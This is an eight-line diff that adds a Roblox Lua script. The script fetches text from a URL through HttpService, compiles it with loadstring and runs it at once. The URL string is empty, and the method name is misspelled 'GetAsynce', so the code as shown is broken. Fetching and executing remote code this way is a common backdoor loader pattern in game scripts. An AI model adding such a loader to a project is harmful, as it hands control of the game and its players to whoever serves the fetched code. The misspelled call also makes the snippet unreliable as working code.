@@ -1,0 +1,8 @@
+local HttpService = game:GetService("HttpService")
+
+local url = ""
+
+local response = HttpService:GetAsynce(url)
+
+local chunk = loadstring(response)
+chunk()
